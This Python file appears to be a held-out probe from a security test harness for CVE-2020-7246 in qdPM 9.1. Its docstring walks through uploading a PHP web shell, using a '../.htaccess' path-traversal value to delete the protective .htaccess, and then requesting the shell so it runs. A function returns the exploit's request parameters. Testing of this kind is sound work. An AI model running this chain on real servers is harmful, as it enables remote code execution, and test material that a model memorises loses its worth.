#!/usr/bin/env python3
"""[HELD-OUT] CVE-2020-7246 residual exploit — path-traversal delete of uploads/.htaccess.

The CVE-2015-3884 mitigation qdPM 9.1 relies on is the uploads/.htaccess script-block
("<FilesMatch \\.php...> Deny from all") that stops a directly-requested uploaded .php
from executing. qdPM 9.1's myAccount photo handler (processForm) has a path-traversal
sink in the delete-photo branch:

    if(remove_photo==1 && strlen(photo_preview)>0)
        unlink(sf_upload_dir.'/users/'.photo_preview);   // photo_preview is attacker-controlled

So on V1 a member can:
    1. upload a PHP web-shell as their profile photo -> lands in uploads/users/<f>.php
       (blocked from executing by uploads/.htaccess),
    2. submit myAccount update with remove_photo=1 & photo_preview="../.htaccess"
       -> unlink(uploads/users/../.htaccess) == unlink(uploads/.htaccess) -> the
          protective .htaccess is DELETED,
    3. GET /uploads/users/<f>.php -> now EXECUTES -> canary echoed.

Contract:
  V1 (qdPM 9.1): unlink() is unguarded -> .htaccess deleted -> shell executes. REACHES flag.
  V2 (qdPM 9.2): the CVE-2020-7246 fix wraps BOTH the upload move AND the unlink in
      app::is_image() (mime_content_type check) -> a .php never lands and
      "../.htaccess" is not an image so it is never unlinked. BLOCKED (no flag).

NEVER exposed to the system-under-test (held out under _heldout/).
"""
from __future__ import annotations


def candidate() -> dict:
    """Request candidate for the CVE-2020-7246 residual (traversal .htaccess delete)."""
    return {
        "probe_id": "cve-2020-7246-photo-preview-traversal-htaccess-delete",
        "mode": "htaccess_bypass",   # upload .php, unlink the protecting .htaccess via photo_preview, GET it
        "filename": "pcb_bypass.php",
        # qdPM ships a script-block .htaccess in BOTH uploads/users/ and uploads/, and
        # Apache applies them cumulatively; the unlink sink is uploads/users/<photo_preview>,
        # so ".htaccess" removes uploads/users/.htaccess and "../.htaccess" removes uploads/.htaccess.
        "traversals": [".htaccess", "../.htaccess"],
    }


if __name__ == "__main__":
    print(candidate())
